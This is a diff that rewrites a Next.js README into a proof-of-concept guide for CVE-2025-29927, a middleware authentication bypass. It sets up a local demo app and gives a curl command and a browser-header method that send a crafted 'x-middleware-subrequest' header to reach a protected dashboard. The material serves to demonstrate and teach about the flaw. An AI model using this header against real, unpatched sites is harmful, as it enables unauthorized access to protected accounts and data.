@@ -1,36 +1,57 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# Next.js Middleware Vulnerability POC
 
-## Getting Started
+This project is a Proof of Concept (POC) for the article [**Critical Next.js Vulnerability: How a Simple Header Bypasses Authentication (CVE-2025-29927) 🕵️**](http://localhost:3000/blog/critical-nextjs-middleware-vulnerability-cve-2025-29927-authentication-bypass). It demonstrates how the [CVE-2025-29927](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) vulnerability can be exploited to bypass middleware authentication and authorization checks in a Next.js application.
 
-First, run the development server:
+## Description
+
+The vulnerability allows attackers to bypass Next.js middleware by adding a specific header (`x-middleware-subrequest`) to their requests. This can lead to unauthorized access to protected routes, CSP bypasses, and even DoS attacks via cache poisoning.
+
+## How to Run
+
+1. **Clone the Repository**
+
+```bash
+git clone https://github.com/neoxs/nextjs-middleware-vuln-poc.git
+cd nextjs-middleware-vuln-poc
+```
+
+2. **Install Dependencies**
+
+```bash
+npm install
+```
+
+3. **Run the Application**
 
 ```bash
 npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+4. **Exploit the Vulnerability**
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+Open your browser and navigate to `http://localhost:3000/dashboard`. You should be redirected to the login page.
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+You can exploit this vulnerability using one of these methods:
 
-## Learn More
+**Using curl:**
 
-To learn more about Next.js, take a look at the following resources:
+```bash
+curl -X GET http://localhost:3000/dashboard \
+-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
+```
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+**Using a browser with modHeader extension (recommended):**
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+1. Install the [modHeader extension](https://modheader.com/) for your browser
+2. Add a new header with name `x-middleware-subrequest` and value `middleware:middleware:middleware:middleware:middleware`
+3. Navigate to `http://localhost:3000/dashboard` in your browser
 
-## Deploy on Vercel
+You should now have direct access to the dashboard area without authentication.
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+## Important Note
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+This POC is for educational purposes only. The vulnerability has been patched in the latest versions of Next.js. Always ensure your applications are up-to-date and follow best security practices.
+
+## License
+
+This project is licensed under the MIT License. See the **LICENSE** file for details.
